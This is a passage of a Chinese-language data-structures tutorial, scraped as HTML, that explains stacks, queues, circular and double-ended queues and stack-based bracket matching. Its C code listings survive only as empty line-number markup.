style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，而出栈次序为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>5</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">a_{5}, a_{4}, a_{3}, a_{2}, a_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。由此可见，栈的操作特性可以明显地概括为 <strong>后进先出（Last In First Out，LIFO）。</strong></p>
<p>栈的数学性质：<code>n</code> 个不同元素进栈，出栈元素不同排列的个数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac></mstyle><msubsup><mi>C</mi><mrow><mn>2</mn><mi>n</mi></mrow><mi>n</mi></msubsup></mrow><annotation encoding="application/x-tex">\dfrac{1}{n+1} C_{2n}^{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0908em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span>。公式称为 <strong>卡特兰（Catalan）</strong> 数。</p>
</li>
<li>
<p><strong>栈的基本操作</strong></p>
<ul>
<li><strong>InitStack(&amp;S)</strong>：初始化一个空栈 <code>S</code></li>
<li><strong>StackEmpty(S)</strong>：判断一个栈是否为空，若栈 <code>S</code> 为空则返回 <code>true</code>，否则返回 <code>false</code></li>
<li><strong>Push(&amp;S, x)</strong>：进栈，若栈 <code>S</code> 未满，则将 <code>x</code> 加入使之成为新栈顶</li>
<li><strong>Pop(&amp;S，&amp;x)</strong>：出栈，若栈 <code>S</code> 非空，则弹出栈顶元素，并用 <code>x</code> 返回</li>
<li><strong>GetTop(S，&amp;x)</strong>：读栈顶元素，若栈 <code>S</code> 非空，则用 <code>×</code> 返回栈顶元素</li>
<li><strong>DestroyStack(&amp;S)</strong>：销毁栈，并释放栈 <code>S</code> 占用的存储空间（“&amp;” 表示引用调用）</li>
</ul>
</li>
</ol>
<h4> 栈的顺序存储结构</h4>
<p>栈是一种操作受限的线性表，类似于线性表，它也有对应的两种存储方式。</p>
<ol>
<li>
<p><strong>顺序栈的实现</strong></p>
<p>采用顺序存储的栈称为 <strong>顺序栈</strong>，它利用一组地址连续的存储单元存放自栈底到栈顶的数据元素，同时附设一个 <strong>指针（top）</strong> 指示当前栈顶元素的位置。</p>
<p><strong>栈的顺序存储类型可描述为：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>栈顶指针</strong>：<code>S.top</code>，初始时设置 <code>S.top = -1</code> ；栈顶元素：<code>S.data[S.top]</code></li>
<li><strong>进栈操作</strong>：栈不满时，栈顶指针先加 <code>1</code>，再送值到栈顶元素</li>
<li><strong>出栈操作</strong>：栈非空时，先取栈顶元素值，再将栈顶指针减 <code>1</code></li>
<li><strong>栈空条件</strong>：<code>S.top == 1</code>；栈满条件：<code>S.top == MaxSize - 1</code>；栈长：<code>S.top + 1</code></li>
</ul>
<p>由于顺序栈的入栈操作受数组上界的约束，当对栈的最大使用空间估计不足时，有可能发生栈上溢，此时应及时向用户报告消息，以便及时处理，避免出错。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>栈和队列的判空、判满条件，会因实际给的条件不同而变化，上面提到的方法以及下面的代码实现只是在栈顶指针设定的条件下的相应方法，而其他情况则需具体问题具体分析</p>
</div>
</li>
<li>
<p><strong>顺序栈的基本运算</strong></p>
<p>下面是顺序栈上常用的基本运算的实现：</p>
<ul>
<li>
<p><strong>初始化</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>判栈空</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>进栈</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当栈不满时，<code>top</code> 先加 <code>1</code>，再入栈。</p>
</li>
<li>
<p><strong>出栈</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>读栈顶元素</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>仅为读取栈顶元素，并没有出栈操作，因此原栈顶元素依然保留在栈中。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这里 <code>top</code> 指向的是栈顶元素，所以进栈操作为 <code>S.data[++S.top] = x</code>，出栈操作为 <code>x = S.data[S.top--]</code>。若栈顶指针初始化为 <code>S.top = 0</code>，即 <code>top</code> 指向栈顶元素的下一位置，则入栈操作变为 <code>S.data[S.top++] = x</code>；出栈操作变为 <code>x = S.data[--S.top]</code>。相应的栈空、栈满条件也会发生变化</p>
</div>
</li>
</ul>
</li>
<li>
<p><strong>共享栈</strong></p>
<p>利用栈底位置相对不变的特性，可让两个顺序栈共享一个一维数组空间，将两个栈的栈底分别设置在共享空间的两端，两个栈顶向共享空间的中间延伸。</p>
<p>两个栈的栈顶指针都指向栈顶元素，<code>top0 = -1</code> 时 <code>0</code> 号栈为空，<code>top1 = MaxSize</code> 时 <code>1</code> 号栈为空；仅当两个栈顶指针相邻（<code>top1 - top0 = 1</code>）时，判断为栈满。当 <code>0</code> 号栈进栈时 <code>top0</code> 先加 <code>1</code> 再赋值，<code>1</code> 号栈进栈时 <code>top1</code> 先减 <code>1</code> 再赋值；出栈时则刚好相反。</p>
<p>共享栈是为了更有效地利用存储空间，两个栈的空间相互调节，只有在整个存储空间被占满时才发生上溢。其存取数据的时间复杂度均为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，所以对存取效率没有什么影响。</p>
</li>
</ol>
<h4> 栈的链式存储结构</h4>
<p>采用链式存储的栈称为 <strong>链栈</strong>，链栈的优点是 <strong>便于多个栈共享存储空间和提高其效率，且不存在栈满上溢的情况</strong>。通常采用单链表实现，并规定所有操作都是在单链表的表头进行的。这里规定链栈没有头结点，<code>Lhead</code> 指向栈顶元素。</p>
<p><strong>栈的链式存储类型可描述为：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>采用链式存储，便于结点的插入与删除。链栈的操作与链表类似，入栈和出栈的操作都在链表的表头进行。需要注意的是，对于带头结点和不带头结点的链栈，具体的实现会有所不同。</p>
<h3> 队列</h3>
<h4> 队列的基本概念</h4>
<ol>
<li>
<p><strong>队列的定义</strong></p>
<p>队列（Queue）简称队，也是一种操作受限的线性表，<strong>只允许在表的一端进行插入，而在表的另一端进行删除</strong>。向队列中插入元素称为入队或进队；删除元素称为出队或离队。这和日常生活中的排队是一致的，最早排队的也是最早离队的，其操作的特性是 <strong>先进先出（First In First Out，FIFO）。</strong></p>
<ul>
<li><strong>队头（Front）</strong>：允许删除的一端，又称队首</li>
<li><strong>队尾（Rear）</strong>：允许插入的一端</li>
<li><strong>空队列</strong>：不含任何元素的空表</li>
</ul>
</li>
<li>
<p><strong>队列常见的基本操作</strong></p>
<ul>
<li><strong>InitQueue(&amp;Q)</strong>：初始化队列，构造一个空队列 <code>Q</code></li>
<li><strong>Queuempty(Q)</strong>：判队列空，若队列 <code>Q</code> 为空返回 <code>true</code>，否则返回 <code>false</code></li>
<li><strong>EnQueue(&amp;Q, x)</strong>：入队，若队列 <code>Q</code> 未满，将 <code>x</code> 加入，使之成为新的队尾</li>
<li><strong>DeQueue(&amp;Q, &amp;x)</strong>：出队，若队列 <code>Q</code> 非空，删除队头元素，并用 <code>x</code> 返回</li>
<li><strong>GetHead(Q, &amp;x)</strong>：读队头元素，若队列 <code>Q</code> 非空，则将队头元素赋值给 <code>x</code></li>
</ul>
<p>需要注意的是，栈和队列是操作受限的线性表，因此不是任何对线性表的操作都可以作为栈和队列的操作。比如：不可以随便读取栈或队列中间的某个数据。</p>
</li>
</ol>
<h4> 队列的顺序存储结构</h4>
<ol>
<li>
<p><strong>队列的顺序存储</strong></p>
<p>队列的顺序实现是指分配一块连续的存储单元存放队列中的元素，并附设两个指针：队头指针 <code>front</code> 指向队头元素，队尾指针 <code>rear</code> 指向队尾元素的下一个位置。</p>
<p><strong>队列的顺序存储类型可描述为：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>初始时</strong>：<code>Q.front = Q.rear = 0</code></li>
<li><strong>进队操作</strong>：队不满时，先送值到队尾元素，再将队尾指针加 <code>1</code></li>
<li><strong>出队操作</strong>：队不空时，先取队头元素值，再将队头指针加 <code>1</code></li>
</ul>
</li>
<li>
<p><strong>循环队列</strong></p>
<p>前面指出了顺序队列的缺点，这里引出循环队列的概念。将顺序队列臆造为一个环状的空间，即把存储队列元素的表从逻辑上视为一个环，称为循环队列。当队首指针 <code>Q.front = MaxSize - 1</code> 后，再前进一个位置就自动到 <code>0</code>，这可以利用除法取余运算（<code>%</code>）来实现。</p>
<ul>
<li><strong>初始时</strong>：<code>Q.front = Q.rear = 0</code></li>
<li><strong>队首指针进 l</strong>：<code>Q.front = (Q.front + 1) % MaxSize</code></li>
<li><strong>队尾指针进 l</strong>：<code>Q.rear = (Q.rear + 1) % MaxSize</code></li>
<li><strong>队列长度</strong>：<code>(Q.rear + MaxSize - Q.front) % MaxSize</code></li>
<li><strong>出队入队时</strong>：指针都按顺时针方向进 <code>1</code></li>
</ul>
<p>循环队列队空的条件是 <code>Q.front == Q.rear</code>。若入队元素的速度快于出队元素的速度，则队尾指针很快就会赶上队首指针，此时可以看出队满时也有 <code>Q.front == Q.rear</code>。</p>
<p><strong>为了区分是队空还是队满的情况，有三种处理方式：</strong></p>
<ul>
<li>
<p>牺牲一个单元来区分队空和队满，入队时少用一个队列单元，这是一种较为普遍的做法，约定以 “队头指针在队尾指针的下一位置作为队满的标志”</p>
<ul>
<li>队满条件：<code>(Q.rear + 1) % MaxSize == Q.front</code></li>
<li>队空条件：<code>Q.front == Q.rear</code></li>
<li>队列中元素的个数：<code>(Q.rear - Q.front + MaxSize) % MaxSize</code></li>
</ul>
</li>
<li>
<p>类型中增设表示元素个数的数据成员。这样，队空的条件为 <code>Q.size == 0</code>；队满的条件为 <code>Q.size == MaxSize</code>。这两种情况都有 <code>Q.front == Q.rear</code></p>
</li>
<li>
<p>类型中增设 <code>tag</code> 数据成员，以区分是队满还是队空。<code>tag</code> 等于 <code>0</code> 时，若因删除导致 <code>Q.front == Q.rear</code>，则为队空；<code>tag</code> 等于 <code>1</code> 时，若因插入导致 <code>Q.front == Q.rear</code>，则为队满</p>
</li>
</ul>
</li>
<li>
<p><strong>循环队列的操作</strong></p>
<ul>
<li>
<p><strong>初始化</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>判队空</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>入队</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>出队</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ul>
</li>
</ol>
<h4> 队列的链式存储结构</h4>
<ol>
<li>
<p><strong>队列的链式存储</strong></p>
<p>队列的链式表示称为链队列，它实际上 <strong>是一个同时带有队头指针和队尾指针的单链表</strong>。头指针指向队头结点，尾指针指向队尾结点，即单链表的最后一个结点（注意与顺序存储的不同）。</p>
<p><strong>队列的链式存储类型可描述为：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当 <code>Q.front == NULL</code> 且 <code>Q.rear == NULL</code> 时，链式队列为空。</p>
<p>出队时，首先判断队是否为空，若不空，则取出队头元素，将其从链表中摘除，并让 <code>Q.front</code> 指向下一个结点（若该结点为最后一个结点，则置 <code>Q.front</code> 和 <code>Q.rear</code> 都为 <code>NULL</code>）。入队时，建立一个新结点，将新结点插入到链表的尾部，并让 <code>Q.rear</code> 指向这个新插入的结点（若原队列为空队，则令 <code>Q.front</code> 也指向该结点）。</p>
<p>不难看出，不带头结点的链式队列在操作上往往比较麻烦，因此通常将链式队列设计成一个带头结点的单链表，这样插入和删除操作就统一了。</p>
<p>用单链表表示的链式队列特别适合于数据元素变动比较大的情形，而且不存在队列满且产生溢出的问题。另外，假如程序中要使用多个队列，与多个栈的情形一样，最好使用链式队列，这样就不会出现存储分配不合理和 “溢出” 的问题。</p>
</li>
<li>
<p><strong>链式队列的基本操作</strong></p>
<ul>
<li>
<p><strong>初始化</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>判队空</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>入队</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>出队</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ul>
</li>
</ol>
<h4> 双端队列</h4>
<p>双端队列是指 <strong>允许两端都可以进行入队和出队操作的队列</strong>。其元素的逻辑结构仍是线性结构。将队列的两端分别称为前端和后端，两端都可以入队和出队。</p>
<p>在双端队列进队时，前端进的元素排列在队列中后端进的元素的前面，后端进的元素排列在队列中前端进的元素的后面。在双端队列出队时，无论是前端还是后端出队，先出的元素排列在后出的元素的前面。</p>
<p><strong>输出受限的双端队列</strong>：允许在一端进行插入和删除，但在另一端只允许插入的双端队列称为输出受限的双端队列。</p>
<p><strong>输入受限的双端队列</strong>：允许在一端进行插入和删除，但在另一端只允许删除的双端队列称为输入受限的双端队列。若限定双端队列从某个端点插入的元素只能从该端点删除，则该双端队列就蜕变为两个栈底相邻接的栈。</p>
<p>设有一个双端队列，输入序列为 <code>1, 2, 3, 4</code>，试分别求出以下条件的输出序列：</p>
<ul>
<li>能由输入受限的双端队列得到，但不能由输出受限的双端队列得到的输出序列</li>
<li>能由输出受限的双端队列得到，但不能由输入受限的双端队列得到的输出序列</li>
<li>既不能由输入受限的双端队列得到，又不能由输出受限的双端队列得到的输出序列</li>
</ul>
<p>先看输入受限的双端队列。假设 <code>end1</code> 端输入 <code>1, 2, 3, 4</code>，则 <code>end2</code> 端的输出相当于队列的输出，即 <code>1, 2, 3, 4</code>；而 <code>end1</code> 端的输出相当于栈的输出，<code>n = 4</code> 时仅通过 <code>end1</code> 端有 <code>14</code> 种输出序列（由 <code>Catalan</code> 公式得出），仅通过 <code>end1</code> 端不能得到的输出序列有 <code>4! - 14 = 10</code> 种：<code>1, 4, 2, 3</code>、<code>2, 4, 1, 3</code>、<code>3, 4, 1, 2</code>、<code>3, 1, 4, 2</code>、<code>3, 1, 2, 4</code>、<code>4, 3, 1, 2</code>、<code>4, 1, 3, 2</code>、<code>4, 2, 3, 1</code>、<code>4, 2, 1, 3</code>、<code>4, 1, 2, 3</code>。</p>
<p>通过 <code>end1</code> 和 <code>end2</code> 端混合输出，可以输出这 <code>10</code> 种中的 <code>8</code> 种，如下表所示。其中，S<sub>L</sub>、X<sub>L</sub> 分别代表 <code>end1</code> 端的进队和出队，X<sub>R</sub> 代表 <code>end2</code> 端的出队。</p>
<table>
<thead>
<tr>
<th style="text-align:center">输出序列</th>
<th style="text-align:center">进队出队顺序</th>
<th style="text-align:center">输出序列</th>
<th style="text-align:center">进队出队顺序</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1, 4, 2, 3</td>
<td style="text-align:center">S<sub>L</sub>X<sub>R</sub>S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">3, 1, 2, 4</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>S<sub>L</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">2, 4, 1, 3</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 1, 2, 3</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">3, 4, 1, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 1, 3, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>L</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">3, 1, 4, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub>S<sub>L</sub>X<sub>L</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 3, 1, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>X<sub>L</sub>X<sub>L</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
</tbody>
</table>
<p>剩下两种是不能通过输入受限的双端队列输出的，即 <code>4, 2, 3, 1</code> 和 <code>4, 2, 1, 3</code>。</p>
<p>再看输出受限的双端队列。假设 <code>end1</code> 端和 <code>end2</code> 端都能输入，仅 <code>end2</code> 端可以输出。若都从 <code>end2</code> 端输入，就是一个栈了。当输入序列为 <code>1, 2, 3, 4</code> 时，输出序列有 <code>14</code> 种。对于其他 <code>10</code> 种不能得到的输出序列，交替从 <code>end1</code> 和 <code>end2</code> 端输入，还可以输出其中 <code>8</code> 种。设 S<sub>L</sub> 代表 <code>end1</code> 端的输入，S<sub>R</sub>、X<sub>R</sub> 分别代表 <code>end2</code> 端的输入和输出，则可能的输出序列见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">输出序列</th>
<th style="text-align:center">进队出队顺序</th>
<th style="text-align:center">输出序列</th>
<th style="text-align:center">进队出队顺序</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1, 4, 2, 3</td>
<td style="text-align:center">S<sub>L</sub>X<sub>R</sub>S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">3, 1, 2, 4</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>S<sub>L</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">2, 4, 1, 3</td>
<td style="text-align:center">S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 1, 2, 3</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">3, 4, 1, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 2, 1, 3</td>
<td style="text-align:center">S<sub>L</sub>S<sub>R</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
<tr>
<td style="text-align:center">3, 1, 4, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
<td style="text-align:center">4, 3, 1, 2</td>
<td style="text-align:center">S<sub>L</sub>S<sub>L</sub>S<sub>R</sub>S<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub>X<sub>R</sub></td>
</tr>
</tbody>
</table>
<p>通过输出受限的双端队列不能得到的两种输出序列是 <code>4, 1, 3, 2</code> 和 <code>4, 2, 3, 1</code>。</p>
<p><strong>综上所述：</strong></p>
<ul>
<li>能由输入受限的双端队列得到，但不能由输出受限的双端队列得到的是 <code>4, 1, 3, 2</code></li>
<li>能由输出受限的双端队列得到，但不能由输入受限的双端队列得到的是 <code>4, 2, 1, 3</code></li>
<li>既不能由输入受限的双端队列得到，又不能由输出受限的双端队列得到的是 <code>4, 2, 3, 1</code></li>
</ul>
<h3> 栈和队列的应用</h3>
<h4> 栈在括号匹配中的应用</h4>
<p>假设表达式中允许包含两种括号：圆括号和方括号，其嵌套的顺序任意即 <code>([] ())</code> 或 <code>[([] [])]</code> 等均为正确的格式，<code>[(])</code> 或 <code>([())</code> 或 <code>(()]</code> 均为不正确的格式。</p>
<p><strong>考虑下列括号序列：</strong></p>
<p><code>[ ( [ ] [ ] ) ]</code></p>
<p><code>1 2 3 4 5 6 7 8</code></p>
<p><strong>分析如下：</strong></p>
<ol>
<li>计算机接收第 <code>1</code> 个括号 <code>[</code> 后，期待与之匹配的第 <code>8</code> 个括号 <code>]</code> 出现</li>
<li>获得了第 <code>2</code> 个括号 <code>(</code>，此时第 <code>1</code> 个括号 <code>[</code> 暂时放在一边，而急迫期待与之匹配的第 <code>7</code> 个括号 <code>)</code> 出现</li>
<li>获得了第 <code>3</code> 个括号 <code>[</code>，此时第 <code>2</code> 个括号 <code>(</code> 暂时放在一边，而急迫期待与之匹配的第 <code>4</code> 个括号 <code>]</code> 出现。第 <code>3</code> 个括号的期待得到满足，消解之后，第 <code>2</code> 个括号的期待匹配又成为当前最急迫的任务</li>
<li>以此类推，可见该处理过程与栈的思想吻合</li>
</ol>
